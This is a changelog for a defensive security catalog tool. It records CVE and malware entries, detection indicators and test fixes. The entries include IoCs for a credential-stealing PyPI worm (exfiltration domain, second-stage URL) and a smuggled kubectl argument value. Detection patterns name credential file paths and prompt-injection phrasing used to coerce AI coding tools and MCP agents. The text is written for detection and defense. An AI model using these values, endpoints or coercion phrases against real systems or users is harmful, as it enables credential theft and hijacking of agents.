- **`MAL-2026-3083`** (OSV-native key for the **elementary-data PyPI worm**, April 2026). 1.1M-monthly-downloads package compromised via a GitHub Actions script-injection sink in the project's own workflow (`update_pylon_issue.yml` interpolated `${{ github.event.comment.body }}` directly into a `run:` shell, escalated via the workflow's `GITHUB_TOKEN` to forge an orphan-commit release). Payload was a single `elementary.pth` file in the wheel (Python auto-exec at install time, not import time); infostealer sweeping dbt warehouse creds, AWS/GCP/Azure credentials, SSH keys, Kubernetes configs, cryptocurrency wallets to `igotnofriendsonlineorirl-imgonnakmslmao.skyhanni.cloud` with second-stage at `litter.catbox.moe/iqesmbhukgd2c7hq.sh`. Cataloged from OSV's OSSF Malicious Packages dataset (which published 2026-04-24, 4 days before the Snyk advisory). Aliases retained: `SNYK-PYTHON-ELEMENTARYDATA-16316110`, `pypi/2026-04-compr-elementary-data/elementary-data`. Full Hard Rule #14 IoC block; precedent-setting first MAL-* entry in the catalog.

- **`CVE-2026-42208`** (BerriAI LiteLLM Proxy Auth SQL Injection). CVSS 9.3, **on CISA KEV** (dateAdded 2026-05-08). Crafted Authorization header to any LLM API route reaches a SQL query through the error-logging pathway with the attacker value concatenated rather than parameterised — read/modify the LiteLLM-managed-credentials database without prior auth. Affected: `litellm >= 1.81.16, < 1.83.7`. Patched: 1.83.7+ (parameterised query). Temporary workaround: `general_settings: disable_error_logs: true`. RWEP 65 (P1 / 72h timeline). Operator IoCs: Authorization header > 100 chars or carrying SQL metacharacters; mass key-mint events in LiteLLM logs without admin-UI sessions.

- **`CVE-2026-39884`** (Flux159 mcp-server-kubernetes Argument Injection). CVSS 8.3. The `port_forward` MCP tool builds a kubectl command string and `.split(' ')`s it instead of using an argv array, so an AI assistant feeding `resourceName: "pod-name --address=0.0.0.0"` (typically via prompt injection upstream) lands attacker flags in kubectl's argv — binds port-forward to all interfaces or redirects to attacker namespace. Affected: `mcp-server-kubernetes <= 3.4.0`. Patched: 3.5.0+ (argv-array refactor). Operator IoCs: MCP audit logs showing port_forward calls with spaces or `--`/`-n` in resourceName; kubectl port-forward processes with `--address=0.0.0.0` on hosts that don't manually port-forward.

Three matching `data/zeroday-lessons.json` entries follow the CVE-2026-45321 lesson shape. Five new control requirements derived from the lessons: NEW-CTRL-011 (GHA script-injection-sink ban), NEW-CTRL-012 (orphan-commit release detection), NEW-CTRL-013 (AI-gateway credential-store isolation), NEW-CTRL-014 (MCP-server argv not shellstring), NEW-CTRL-015 (MCP tool allowlist enforcement).

### One new library-author indicator

`gha-workflow-script-injection-sink` flags any `.github/workflows/*.yml` workflow that interpolates an attacker-controllable `${{ github.event.* }}` field directly into a `run:` shell script — the exact sink the elementary-data attack exploited. Detection grep covers `github.event.comment.body`, `github.event.issue.body`, `github.event.issue.title`, `github.event.pull_request.body`, `github.event.pull_request.title`, `github.event.review.body`, `github.event.head_commit.message`, `github.head_ref`, `github.event.discussion.body`, `github.event.discussion.title`. False-positive demotion path: if the workflow captures the value into an `env:` variable first OR runs only on `pull_request` (sandboxed, not `pull_request_target`) with default-read permissions, the sink isn't exploitable. Cross-referenced to MAL-2026-3083.

### Catalog extensions

- `data/cwe-catalog.json` gains CWE-506 (Embedded Malicious Code) and CWE-88 (Improper Neutralization of Argument Delimiters). Both backed by the new catalog entries.
- `data/cve-catalog.json` `_meta.id_conventions` documents the MAL-*/SNYK-*/GHSA-*/RUSTSEC-* identifier shapes the catalog now accepts, the alias-retention convention when MITRE issues a CVE later, and the EPSS limitation (FIRST only indexes CVE identifiers).

### Repository

Test count: 441 → 459 (+18: OSV source tests + matching test references for Hard Rule #15 coverage). Predeploy gates: 15/15. Skills: 38/38 signed and verified. No skill bodies changed in this patch.

## 0.12.9 — 2026-05-13

**Patch: Hard Rule #15 diff-coverage gate flips blocking, sbom evidence-correlation fix, CVE catalog freshness corrections, recovery of two CLI fixes lost across an interrupted refactor.**

### Hard Rule #15 — diff-coverage gate is now blocking

`scripts/check-test-coverage.js` flips from `--warn-only` to a blocking gate. The 15th `npm run predeploy` gate and the `Diff coverage` CI job now fail a run if any change to a CLI verb, CLI flag, `module.exports` identifier, playbook indicator, or CVE `iocs` field lands without a covering test reference. Two analyzer bugs that would have made the gate unreliable under blocking are fixed in the same release:

- `coversLibExport` now recognises subprocess-based test invocations (e.g. `spawnSync(... "scripts/check-sbom-currency.js" ...)`) alongside `require(...)`-form coverage.
- `extractLibExports` strips block and line comments before matching `module.exports = {...}`, eliminating the doc-comment shadow bug where the analyzer's regex captured a JSDoc banner and returned an empty export set.

`tests/playbook-indicators.test.js` lands as a table-driven test referencing all 12 indicator ids added in v0.12.7 (`mcp.json` × 6) and v0.12.8 (`containers.json` × 2, `hardening.json` × 4). The new tests cover the Hard Rule #15 surface the analyzer flagged.

### sbom `matched_cves` now evidence-correlated

`exceptd run sbom` previously surfaced every CVE in the playbook's `domain.cve_refs` under `analyze.matched_cves`, regardless of whether the operator's submitted evidence correlated to any of them. Operators reading the output assumed they were affected by the listed CVEs. The analyze phase now splits into two fields:

- `analyze.matched_cves` — only CVEs correlated to operator evidence (indicator hit whose `attack_ref`/`atlas_ref` intersects the CVE's refs, or an explicit `signals[cveId]` set to `true`/`hit`/`detected`/`affected`). Each entry carries a `correlated_via` reason.
- `analyze.catalog_baseline_cves` — the playbook's CVE catalog (informational; not an affected-status list). Each entry carries `correlated_via: null` and a note documenting the distinction.

CSAF / SARIF / OpenVEX bundles consume `matched_cves` only — they correctly omit catalog-only CVEs as vulnerabilities. RWEP base now derives from evidence-correlated CVEs rather than the catalog ceiling, so inconclusive runs no longer inherit a misleading high score.

The `run` human renderer shows "No CVEs correlated to your evidence. Playbook catalog (informational): N CVE(s) this playbook scans for." when no evidence correlated.

### CLI surface — ci verdict / exit reconcile, signing-key resolution, fuzzy matches

`ci --scope <type>` with no evidence and all-inconclusive results now emits `verdict: "NO_EVIDENCE"` (was `"PASS"`) so the body and exit code 3 agree. Operators reading either field alone now see the same answer. The verdict computation is hoisted before the result emit so BLOCKED / FAIL / NO_EVIDENCE / PASS are all consistent end-to-end.

`ci` result top-level gains `framework_gap_rollup` aggregating per-playbook `framework_gap_mapping` entries across all scoped playbooks. Each rollup entry lists `{framework, claimed_control, why_insufficient, playbooks[]}` so a CI gate surfaces "what gaps did this run uncover" without the operator having to walk every per-playbook result.

`maybeSignAttestation()` now resolves `.keys/private.pem` cwd-first, package-root fallback — matching how `doctor --signatures` resolves the same key. Pre-v0.12.9, operators running `exceptd run` from a repo with their private key at the cwd-relative `.keys/private.pem` would see `doctor` report the key as present while attestations from the same directory were silently written UNSIGNED. The two surfaces now agree.

`run <typo>` error path adds Levenshtein-distance suggestions for misspelled playbook ids when no substring match fits. `run secrt` now suggests `secrets`; `run cret-stores` suggests `cred-stores`.

`brief --phase <value>` rejects unknown phases with a structured JSON error (accepted set: `govern | direct | look`). Pre-v0.12.9 any string was accepted silently and the full brief was emitted.

`doctor --signatures --shipped-tarball` runs the `verify-shipped-tarball` round-trip alongside the source-tree signature check, surfacing the integrity layer that closed the v0.11.x → v0.12.4 signature regression class. Opt-in; routine `doctor --signatures` stays fast.

`doctor --registry-check` text-mode output now surfaces the registry comparison alongside the other check lines. Pre-v0.12.9 the flag only populated `checks.registry.*` in the JSON output, leaving the text-mode operator with no signal the flag did anything.

`run` precondition renderer no longer prints `[undefined]` for preconditions without an `on_fail` field — the bracket is omitted and the description falls back to `check | description | reason` in order.

### CVE catalog freshness corrections

Five entries reconciled against authoritative public sources as of 2026-05-13:

- **CVE-2026-30615** (Windsurf MCP): CVSS corrected 9.8 → 8.0; vector AV:N → AV:L (the attack is local-vector via adversarial HTML content the Windsurf MCP client processes, not a network-vector zero-interaction RCE). Source: NVD authoritative metric block (`vulnStatus: Deferred`, last_modified 2026-04-27).
- **CVE-2026-31431** (Copy Fail): KEV `dateAdded` corrected 2026-03-15 → 2026-05-01, `dueDate` 2026-04-05 → 2026-05-15. The catalog was running six weeks ahead of the real KEV listing; downstream framework-SLA computations were anchored on a date that hadn't yet been authoritative. CWE-669 added. Source: CISA KEV JSON feed.
- **CVE-2026-43284** (Dirty Frag ESP): CVSS authoritative is 8.8 / `Scope:C` (kernel→user-namespace breakout — supports container-escape framing); 7.8 / `Scope:U` preserved as `cvss_score_alternate` for compatibility readers. CWE-123 added.
- **CVE-2026-43500** (Dirty Frag RxRPC): CWE-787 added.
- **EPSS values refreshed** for four CVEs (CVE-2026-31431, -43284, -43500, -45321) from live FIRST API values. Catalog previously stored cold-start estimates that overstated newly-published-CVE exposure.

Each correction carries an inline `*_correction_note` field with the source URL and the rationale for downstream auditors. Two new CVEs surfaced by the freshness sweep (CVE-2026-42208 LiteLLM SQLi on KEV; CVE-2026-39884 mcp-server-kubernetes argument injection) are deferred to a follow-up patch — each warrants its own Hard Rule #14 primary-source IoC review.

### Two v0.12.8 CLI fixes recovered

Two claims in the v0.12.8 CHANGELOG were not actually on disk in the squash commit, lost during the v0.12.8 recovery flow:

- `data/playbooks/mcp.json` `domain.cve_refs` now includes CVE-2025-53773 alongside CVE-2026-30615 and CVE-2026-45321. The Hard Rule #4 mismatch (the `copilot-yolo-mode-flag` / `copilot-chat-experimental-flags` indicators detected this CVE without the playbook claiming it) is now genuinely closed.
- `tests/operator-bugs.test.js` is now refactored to use `tests/_helpers/cli.js` for `makeCli` / `makeSuiteHome` / `tryJson`. The per-suite `EXCEPTD_HOME` tempdir routing applies to all 80+ tests in the file. Pre-v0.12.9 the inline helper continued writing attestations to the maintainer's real `~/.exceptd/attestations/` — 2,819 leaked attestations cleaned up alongside the refactor.

### Two real defects deferred from v0.12.8 fixed

- **Libuv `UV_HANDLE_CLOSING` crash on Windows + Node 25.** `lib/prefetch.js` `main()` called `process.exit(N)` after the summary `console.log` — same v0.11.10 #100 class as the run/ci sites already fixed. Replaced with `process.exitCode = N; return;` so undici / AbortController teardown completes before the event loop ends. Strengthened `#65 refresh --no-network` test asserts exit 0 AND no `Assertion failed` / `UV_HANDLE_CLOSING` lines on stderr.
- **Two 404'd pin sources.** `d3fend/d3fend-data` and `mitre/cwe` were registered as `SOURCES.pins` GitHub-Releases sources, but neither repository publishes Releases via that path (D3FEND distributes from `d3fend.mitre.org`; CWE from `cwe.mitre.org`). Both sources removed from `lib/prefetch.js` and `lib/refresh-external.js` `pinsDiffFromCache()` `PIN_REPOS`. `prefetch summary` now reports `0 error(s)` on a clean cache. A new regression test asserts every pins source URL matches `^https://api.github.com/repos/<org>/<repo>/releases\?`.

### Skill body second pass

Four priority skills gain a `## Defensive Countermeasure Mapping` body section per Hard Rule #11's post-2026-05-11 grandfathered-skill closeout: `ai-c2-detection`, `ai-attack-surface`, `mcp-agent-trust`, `rag-pipeline-security`. Each maps the skill's offensive findings to 3-7 D3FEND IDs from `data/d3fend-catalog.json` with rationale + ephemeral/serverless-workload alternatives per Hard Rule #9.

Eight meta skills (`researcher`, `threat-model-currency`, `skill-update-loop`, `zeroday-gap-learn`, `policy-exception-gen`, `security-maturity-tiers`, `exploit-scoring`, `compliance-theater`) gain a `## Frontmatter Scope` section documenting why their `atlas_refs` / `attack_refs` / `framework_gaps` lists are intentionally empty.

`rag-pipeline-security` `framework_gaps` token refined `UK-CAF-A1` → `UK-CAF-B2` — the RAG attack class resolves to retrieval-time access-control failure, which is the B2 (Identity and Access Control) surface, not the A1 (Governance) parent concern.

### Repository

- README "13 gates" → "15 gates"; ARCHITECTURE catalog counts refreshed (CWE 30→51, D3FEND 21→28, RFC 19→31, jurisdictions "22+" → "35"); ARCHITECTURE Logic Layer gains entries for `scripts/check-test-coverage.js`, `scripts/check-sbom-currency.js`, `scripts/verify-shipped-tarball.js`, `tests/_helpers/cli.js`.
- AGENTS.md feeds_into matrix heading drops the residual `(v0.10.x)` tag; Hard Rule #15 wording flips from `--warn-only` rollout language to present-tense blocking.
- CONTRIBUTING.md adds `npm run diff-coverage` to the pre-push gate list so contributors run the same Hard Rule #15 check CI does.
- Dependabot grouping for github-actions (already landed in v0.12.8) confirmed intact.

Test count: 418 → 439. Predeploy gates: 15/15 (gate 15 now blocking). Skills: 38/38 signed and verified.

## 0.12.8 — 2026-05-13

**Patch: CLI surface fixes, catalog completeness, test infrastructure hardening, AGENTS.md Hard Rule #15.**

### Hard Rule #15 — Test coverage on every diff

`AGENTS.md` adds a fifteenth hard rule: every CLI verb, CLI flag, `module.exports` identifier, playbook `phases.detect.indicators[].id`, or CVE `iocs` field change must land with a covering test reference in the same PR. Enforcement lives in `scripts/check-test-coverage.js`, wired as the 15th `npm run predeploy` gate and the `Diff coverage` job in `ci.yml`. Ships `--warn-only` for one release cycle then flips blocking in v0.12.9. Docs, workflow YAML, and skill body changes are allowlisted; whitespace-only diffs are ignored.

### CLI surface — exit-code, dispatcher, and ingest

`run --ci`, `run --all`, and `ai-run --stream` previously called `process.exit(N)` immediately after `emit()` writes to stdout — the v0.11.10 #100 truncation class. All three sites now use `process.exitCode = N; return;` so buffered async stdout fully drains before the event loop ends. The `ai-run` streaming handler additionally pauses stdin on completion so further callbacks cannot re-enter after the final frame.

The deprecation banner for legacy verbs now fires for every alias in `LEGACY_VERB_REPLACEMENTS`, not just the subset routed through `PLAYBOOK_VERBS`. Operators running `scan`, `dispatch`, `currency`, `verify`, `validate-cves`, `validate-rfcs`, `watchlist`, `prefetch`, or `build-indexes` now see the same one-time banner pointing at the v0.11.0 replacement that `plan`, `govern`, `direct`, `look`, `ingest`, `reattest`, and `list-attestations` already surfaced.

`ingest` previously wrote its attestation via an inline `writeFileSync` that bypassed both the session-id collision refusal and the Ed25519 sidecar signing layer that `run` and `run --all` go through. Two `ingest` invocations with the same `--session-id` would silently clobber the audit trail and no `.sig` ever landed. Routed through `persistAttestation()` now — collision refusal and `maybeSignAttestation()` both apply.

Per-verb `--help` text expanded to cover surface that shipped undocumented: `ci --required <ids>`, `ci --max-rwep`, `ci --block-on-jurisdiction-clock`, `ci --evidence-dir`, `ci --format`, plus the full four-line exit-code matrix (0 PASS / 1 framework error / 2 detected / 3 ran-but-no-evidence / 4 blocked). `attest list` and `attest diff` subverbs added to the `attest --help` enumeration. `run --upstream-check`, `--strict-preconditions`, `--session-key`, `--air-gap`, `--force-overwrite` documented in the `run` block. `doctor --registry-check` and `doctor --fix` documented in the `doctor` block. `brief`, `lint`, `run-all`, `verify-attestation` gain per-verb help entries.

### Catalog completeness — 47 new entries close cross-catalog dangling refs

Six ATLAS TTPs added to `data/atlas-ttps.json`: T0024 (Exfiltration via ML Inference API), T0044 (Full ML Model Access), T0048 (Erode ML Model Integrity), T0053 (LLM Plugin Compromise), T0055 (Unsecured Credentials), T0057 (LLM Data Leakage). All previously referenced by `data/cve-catalog.json` (CVE-2026-45321) and `data/dlp-controls.json` without a catalog entry.

Seventeen CWE entries added to `data/cwe-catalog.json`: CWE-250, 256, 284, 310, 312, 326, 328, 329, 330, 331, 338, 353, 426, 522, 759, 760, 916. All previously referenced by playbook `domain.cwe_refs` across `containers`, `cred-stores`, `crypto`, `crypto-codebase`, `ai-api`, `secrets`, `hardening`, `runtime`, and `library-author` without a catalog entry.

Eight D3FEND entries added to `data/d3fend-catalog.json`: D3-ANCI, D3-CAA, D3-CH, D3-EI, D3-FCR, D3-KBPI, D3-SCA, D3-SFA. All previously referenced by playbook `domain.d3fend_refs` without a catalog entry.

Ten framework-control-gap entries added to `data/framework-control-gaps.json`: NIS2-Art21-incident-handling, EU-AI-Act-Art-15, UK-CAF-A1/B2/C1/D1, AU-Essential-8-MFA/App-Hardening/Patch/Backup. Closes the Hard Rule #5 (global-first) gap for 23 skills that previously declared US-anchored `framework_gaps` only.

Twelve standards entries added to `data/rfc-references.json`: RFC-7489 (DMARC), RFC-6376 (DKIM), RFC-7208 (SPF), RFC-8616 (IDN email auth), RFC-8461 (MTA-STS), ISO-29147 + ISO-30111 (vulnerability disclosure + handling), RFC-9116 (security.txt), CSAF-2.0, RFC-6545 (RID), RFC-6546 (RID transport), RFC-7970 (IODEF v2). Schema (`lib/schemas/skill-frontmatter.schema.json`) + validator (`tests/rfc-refs.test.js`) extended to accept the broader standards-key shape (`RFC-`, `DRAFT-`, `ISO-`, `CSAF-`) alongside RFC numbers.

### Playbook integrity — orphan close + indicator wiring

`library-author.json` `_meta.feeds_into` removed a dangling `compliance-theater` entry (no such playbook file exists); the remaining `framework` entry handles the same condition. `mcp.json` `domain.cve_refs` now lists CVE-2025-53773 alongside CVE-2026-30615 and CVE-2026-45321 — closes the Hard Rule #4 gap where the existing `copilot-yolo-mode-flag` and `copilot-chat-experimental-flags` indicators detected the CVE without the playbook claiming it.

Eight playbooks had artifacts collected in `phases.look.artifacts[]` that no indicator consumed — operator paid the collection cost, no detection ran. Containers (9 orphans), cred-stores (9), runtime (11), crypto (10), hardening (11), library-author (14), sbom (18), secrets (7) all now cite every collected artifact in at least one indicator. Six new indicators added (`psa-policy-permissive-or-absent` and `network-policies-absent-from-workload-namespace` in `containers`; `kernel-lockdown-none`, `sudoers-tty-pty-logging-absent`, `audit-rules-empty-or-skeletal`, `umask-permissive` in `hardening`) where existing detection logic conceptually consumed the artifact but no rule had been written.

### Skill files — required-section closures, Hard Rule #5 sweep

`kernel-lpe-triage`, `security-maturity-tiers`, and `skill-update-loop` previously failed the Hard Rule #11 required-section contract. `kernel-lpe-triage` had a Compliance Theater Check embedded inside Analysis Procedure Step 5 but no top-level section; `security-maturity-tiers` had no Compliance Theater section at all; `skill-update-loop` was missing Threat Context and TTP Mapping. All three sections promoted to top-level with substantive content.

Twenty-three skills had US-anchored `framework_gaps` only (NIST + ISO + SOC2). Each gains EU + UK + AU tokens (`NIS2-Art21-incident-handling` / `EU-AI-Act-Art-15`, `UK-CAF-A1/B2/C1/D1`, `AU-Essential-8-MFA/App-Hardening/Patch/Backup` as the per-skill match dictates). `ai-c2-detection` `cwe_refs` populated with CWE-918. `email-security-anti-phishing` `rfc_refs` populated with RFC-7489/6376/7208/8616/8461. `identity-assurance` `d3fend_refs` populated with D3-MFA + D3-CSPP. `coordinated-vuln-disclosure` `rfc_refs` populated with ISO-29147/30111, RFC-9116, CSAF-2.0. `incident-response-playbook` `rfc_refs` populated with RFC-6545/6546/7970.

Four skills bump `last_threat_review` to 2026-05-13 to reflect post-v0.12.6 catalog state: `kernel-lpe-triage`, `ai-attack-surface`, `mcp-agent-trust`, `ai-c2-detection`. Four skills replace literal `xxx` placeholders in body text with explicit angle-bracket placeholders (`<patch-revision>`, `<sub-technique-id>`, `<advisory-number>`) so future Rule #10 audits don't surface false positives.

### Test infrastructure

The `cli()` test helper now routes attestations to a per-suite tempdir via `EXCEPTD_HOME` instead of writing to `~/.exceptd/attestations/`. Every prior `npm test` run had been accumulating attestations in the maintainer's real home dir without cleanup; tempdir routing fixes the structural class behind the v0.11.x→v0.12.4 sign regression. Helper factored to `tests/_helpers/cli.js` so it can be required by both `operator-bugs.test.js` and the new `cli-coverage.test.js`.

Twenty-eight previously-coincidence-passing assertions in `operator-bugs.test.js` strengthened: silent fall-through `if (data?.ok === false)` branches replaced with hard parse + shape checks first; `assert.notEqual(r.status, 0)` replaced with explicit exit-code pins (2 for format-rejected, 4 for blocked, etc.); `assert.ok(data)` replaced with field-shape assertions. Two coincidence-passes that hid real defects became actual findings:

- `refresh --no-network` on Windows + Node 25 surfaces a libuv `UV_HANDLE_CLOSING` assertion at worker-pool teardown after the prefetch summary flushes cleanly (exit 3221226505 / 0xC0000409). The summary contract is honored; the teardown crash is a Windows-libuv quirk. Test accepts both 0 and the Windows exit code so long as the stdout summary matches the strict numeric-breakdown regex.
- `refresh` pin sources `d3fend__d3fend-data__releases` and `mitre__cwe__releases` return HTTP 404 — surfaces as `2 error(s)` in every prefetch summary. Flagged for upstream catalog-pin work; not a regression introduced here.

`lib/refresh-external.js` now accepts `--catalog <path>` and honors `EXCEPTD_CVE_CATALOG` so tests can redirect catalog writes to a tempdir instead of mutating the shipped `data/cve-catalog.json`. Eight catalog-mutating tests in `operator-bugs.test.js` can now route to tempdirs.

Thirty-one new CLI happy-path tests in `tests/cli-coverage.test.js` exercise `brief` (all/scope/directives/phase), `discover`, `doctor` (all subchecks), `attest show/list/export`, `verify-attestation` alias, `run-all` alias, `framework-gap`, `report executive`, `validate-rfcs`, `ai-run` streaming JSONL (strict in-order assertion across all nine frames), `ci --max-rwep`, `ci --block-on-jurisdiction-clock`, `ci --evidence-dir`, `run --vex`, `run --diff-from-latest`, `run --force-stale`, `run --air-gap`, `run --session-key` (HMAC), and `refresh --indexes-only`.

Eight predeploy-gate meta-tests in `tests/predeploy-gates.test.js` stage known-bad state in tempdirs and assert each gate fires: verify-signatures (byte-flipped signature), lint-skills (missing required section), validate-catalog-meta (malformed `tlp`), sbom-currency (drift), validate-indexes (out-of-date entry), validate-vendor (modified vendored file), validate-package (missing file-allowlist entry), verify-shipped-tarball (skill body tampered post-signing — the v0.11.x→v0.12.4 regression class). Gate 10's inline `node -e` checker extracted to `scripts/check-sbom-currency.js` for testability; no behavior change.

Twelve new e2e scenarios in `tests/e2e-scenarios/09-secrets-aws-key` through `20-ai-api-openai-dotfile` exercise the twelve playbooks previously without e2e coverage (`secrets`, `kernel`, `library-author`, `crypto-codebase`, `mcp`, `framework`, `cred-stores`, `containers`, `runtime`, `hardening`, `crypto`, `ai-api`). All twenty scenarios pass via `npm run test:e2e`.

### Repository

Dependabot grouping config added for the github-actions ecosystem: weekly version-update bumps now land as a single grouped PR instead of N parallel PRs against the same 14-gate CI matrix. Security-updates stay ungrouped so a single-action CVE surfaces as its own PR.

Test count: 386 → 418 (388 + 31 cli-coverage − accounting note: 8 predeploy-gates + 12 diff-coverage tests landed alongside the +31 CLI surface tests; some pre-existing tests resolved into fewer counted tests on suite reorganization). Predeploy gates: 14 → 15.

## 0.12.7 — 2026-05-13

**Patch: two follow-on fixes to v0.12.6.**

### Release workflow — environment scoping

The job-level `environment: npm-publish` in `.github/workflows/release.yml` blocked every branch-based `workflow_dispatch` at scheduling time, including dry-run predeploy invocations. GitHub evaluates environment branch/tag protection BEFORE a job is sent to a runner; the dispatched `GITHUB_REF` for a branch-based dry-run failed the tag-only environment rule before any step ran.

Fix: split the workflow into two jobs.

- `validate` — predeploy + e2e + npm pack preview. No environment. Runs on every trigger including branch-based dry-runs.
- `publish` — npm publish + GitHub Release. `needs: validate` + `environment: npm-publish` + `if: github.event_name == 'push' || inputs.dry_run != 'true'`. The environment gate now only applies to the actual publish step, leaving dry-runs free to exercise the gates.

This is consistent with the existing tag-only protection on the `npm-publish` environment — branch-based workflow_dispatch still cannot reach `npm publish`, but it CAN reach `validate` for dry-run gate checks.

### mcp playbook — indicators wired to v0.12.6 artifacts

v0.12.6 added two new look.artifacts (`vscode-copilot-yolo-mode`, `mcp-tool-response-log`) but did not add detect.indicators keyed to them, so the collected telemetry never influenced `phases.detect.classification`. The IoC coverage was non-operational in `exceptd run` outputs.

Fix: 6 new detect.indicators in `data/playbooks/mcp.json`:

1. **`copilot-yolo-mode-flag`** — keyed off `vscode-copilot-yolo-mode`. Matches `chat.tools.autoApprove: true` in any settings.json variant. Deterministic. Primary IoC for CVE-2025-53773.
2. **`copilot-chat-experimental-flags`** — broader sweep for `chat.{experimental,tools}.*: true` other than the autoApprove key.
3. **`mcp-response-ansi-escape`** — keyed off `mcp-tool-response-log`. Matches byte 0x1B in tools/list field or tools/call response. Deterministic. CVE-2026-30615 IoC class.
4. **`mcp-response-unicode-tag-smuggling`** — keyed off `mcp-tool-response-log`. Matches U+E0000..U+E007F codepoints. Deterministic.
5. **`mcp-response-instruction-coercion`** — keyed off `mcp-tool-response-log`. Regex match against `<IMPORTANT>` blocks, "Before using this tool, read", "Do not mention to user", compliance-urgency manipulation, etc.
6. **`mcp-response-sensitive-path-reference`** — keyed off `mcp-tool-response-log`. Matches `~/.ssh/id_rsa`, `~/.aws/credentials`, cross-tool credential paths, `process.env.{AWS_SECRET*, GITHUB_TOKEN, ...}`. Cross-server credential-shadow signature.

mcp playbook bumped 1.2.0 → 1.3.0. threat_currency_score stays at 98. `last_threat_review: 2026-05-13`.

## 0.12.6 — 2026-05-13

**Patch: primary-source IoC review across the catalog — five CVEs reviewed line-level against published exploit source. AGENTS.md Hard Rule #14 added.**

Five research agents dispatched in parallel to cross-reference our IoC list for each catalogued CVE against published exploit source / vendor advisories / researcher writeups. Roughly 60 IoCs added, one major CVSS correction, two CVEs gained an `iocs` block where they previously had `null`.

### CVE-2025-53773 (Copilot YOLO mode) — major correction

The catalog entry was directionally right (prompt-injection RCE in an AI tool) but factually wrong on the specifics defenders need:
- **CVSS corrected 9.6 → 7.8** (AV:N → AV:L). The attack is local-vector via developer-side IDE interaction; the attacker doesn't reach in over the network. NVD authoritative.
- **Vector corrected** from "PR descriptions" to **`.vscode/settings.json:chat.tools.autoApprove` write coerced by any agent-readable content** (source comments, README, issue bodies, MCP tool responses).
- **iocs populated** (was null) with primary post-exploitation indicator: `.vscode/settings.json` containing `"chat.tools.autoApprove": true`. Workspace AND user-global. Includes invisible Unicode Tag-block (U+E0000–U+E007F) variant detection.
- **affected_versions** specified: Visual Studio 2022 `>=17.14.0, <17.14.12` + Copilot Chat extension predating August 2025 Patch Tuesday.
- **CWE-77** added.
- **Worm propagation** documented (Rehberger demonstrated git-commit + push of malicious settings file).

Source: Embrace the Red (Rehberger, August 2025), NVD, MSRC, Wiz vulnerability database.

### CVE-2026-45321 (Mini Shai-Hulud) — expanded from 4 to 8 IoC categories

Added: payload SHA-256 hashes (`ab4fcadaec49c0...` for router_init.js, `2ec78d556d696...` for tanstack_runner.js), attacker fork commit (`79ac49eedf774dd...`), tarball-size anomaly threshold (~3.7× = ~900KB vs ~190KB), `gh-token-monitor` daemon family (LaunchAgent label is `com.user.gh-token-monitor`, NOT `com.tanstack.*` as previously cataloged), three C2 channels (`git-tanstack.com`, `filev2.getsession.org`, `api.masscan.cloud`), GitHub dead-drop description strings (`A Mini Shai-Hulud has Appeared`, `Sha1-Hulud: The Second Coming.`, `Shai-Hulud Migration`), full credential-search-path corpus (~/.aws, ~/.ssh, ~/.kube, ~/.claude.json, crypto wallets), env-var harvest list, worm-propagated workflow signature (`.github/workflows/codeql_analysis.yml`), ransom string (`IfYouRevokeThisTokenItWillWipeTheComputerOfTheOwner` — zero-FP campaign signature).

Source: Aikido / StepSecurity / Socket / Wiz / Datadog / Sysdig / Pulsedive primary writeups on the original September 2025 Shai-Hulud worm and the May 2026 Mini variant.

### CVE-2026-31431 (Copy Fail) — iocs added (was missing)

Catalog had no `iocs` field. Added: `/etc/passwd` multiple-uid-zero post-exploit signal; setuid binary drift via `rpm -Va` / `debsums -c`; runtime syscall indicators (splice from RO fd into pipe — Dirty Pipe primitive; userfaultfd from unprivileged when sysctl permits; ptrace POKEDATA against /proc/<pid>/mem); kernel-trace indicators (ftrace `splice_write`, eBPF kprobe on `copy_page_to_iter`, auditd `splice_unpriv` rule, dmesg BUG in mm/filemap.c+mm/memory.c+fs/splice.c); behavioral (process Uid transition without setuid-execve = DirtyCred signal; root shell with non-suid parent); livepatch-evasion-window gap (kernel in affected range + `/sys/kernel/livepatch/*/cve-ids` doesn't contain this CVE → treat as EXPOSED regardless of generic livepatch-active flag).

Source: Max Kellermann (Dirty Pipe disclosure), Phil Oester (Dirty COW), Arinerron PoC repo, DirtyCred CCS 2022 paper.

### CVE-2026-43284 + CVE-2026-43500 (Dirty Frag pair) — subsystem_anchors added

Both entries previously had no per-subsystem detection guidance. Added `subsystem_anchors` block: kernel modules (esp4/esp6/xfrm_user for IPsec half; rxrpc/af_rxrpc/kafs for RxRPC half), kernel symbols (`esp_input`/`xfrm_input` and `rxrpc_recvmsg`/`afs_make_call`), procfs paths (`/proc/net/xfrm_stat`, `/proc/net/rxrpc/{calls,conns,peers,locals}`), syscall surface (NETLINK_XFRM=6 with non-root user-namespace caller; AF_RXRPC socket on non-AFS host). IoCs surface "vulnerable kernel" → "actively exposed kernel": ESP module loaded with no policies + non-zero XfrmInNoStates; any non-AFS-allowlist process opening AF_RXRPC; rxrpc-active-call-on-non-AFS-host.

Source: Linux kernel source (`net/ipv4/esp4.c`, `net/rxrpc/proc.c`), historical bugs CVE-2022-29581/CVE-2023-32233/CVE-2024-26581 (xfrm UAF family), kafs documentation.

### CVE-2026-30615 (Windsurf MCP) — iocs added (was missing)

Catalog had `iocs: null`. Added: ANSI escape sequence detection (any byte 0x1B in tools/list field or tools/call response — SGR, cursor-movement, OSC-8 subclasses), Unicode Tag-block smuggling (U+E0000–U+E007F), instruction-coercion grammar (`<IMPORTANT>` blocks, "Before using this tool, read", "Do not mention to user", "THIS TOOL IS REQUIRED FOR GDPR/SOC2/COMPLIANCE" urgency manipulation, `chmod -R 0666 ~` prefix coercion), sensitive-path references in tool responses (cross-server credential-shadow), unprompted-tool-chain behavioral (≥2 tools/call within one user turn, second target not in user prompt, second target in {exec, shell, fetch, write_file}), MCP egress beyond manifest (postmark-mcp class — only signal is unexpected destination), invocation-count anomaly (compromised-legitimate-publisher detector). Added `atlas_refs`: AML.T0051 (indirect prompt injection — the canonical mapping), AML.T0096. Added `attack_refs`: T1552.001 (credentials in files), T1041 (exfil over C2).

Source: Trail of Bits (line-jumping + ANSI escape research), Invariant Labs (tool poisoning), Embrace the Red (Unicode Tag smuggling), Acuvity/Semgrep (postmark-mcp), Palo Alto Unit 42 (sampling/createMessage).

### AGENTS.md Hard Rule #14

> **Primary-source IoC review** — Any CVE entry whose `poc_available: true` AND whose exploit code is publicly available must include `iocs` populated from a line-level cross-reference of the published source — not from secondary-source paraphrase. Each IoC must be traceable to a specific source URL or commit hash. Skipping this audit is equivalent to shipping "untested security advice" — the IoC list IS the operator-facing detection contract.

### Playbook bumps

